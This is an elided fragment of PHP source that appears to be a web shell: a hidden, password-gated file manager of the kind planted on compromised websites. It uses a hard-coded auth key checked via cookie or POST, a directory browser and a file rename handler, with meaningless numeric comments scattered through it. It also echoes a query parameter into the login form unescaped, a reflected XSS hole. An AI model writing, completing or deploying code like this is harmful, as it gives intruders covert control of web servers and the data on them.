...
$auth_key = "fb92bf692048da9ac3c9fbf5ea7bae6d";
...
$pass = false;
if (isset($_COOKIE['pw_name_24654'])) {
    if(($_COOKIE['pw_name_24654']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_24654'])) {
        if(($_POST['pw_name_24654']) == $auth_key) {
            setcookie("pw_name_24654", $_POST['pw_name_24654']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_24654' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774111897 1724682774887129 1724682774330606 1724682774961816
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774111897 1724682774887129 1724682774330606 1724682774961816
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774111897 1724682774887129 1724682774330606 1724682774961816
            $name = PATH . "/" . $_GET['r'];
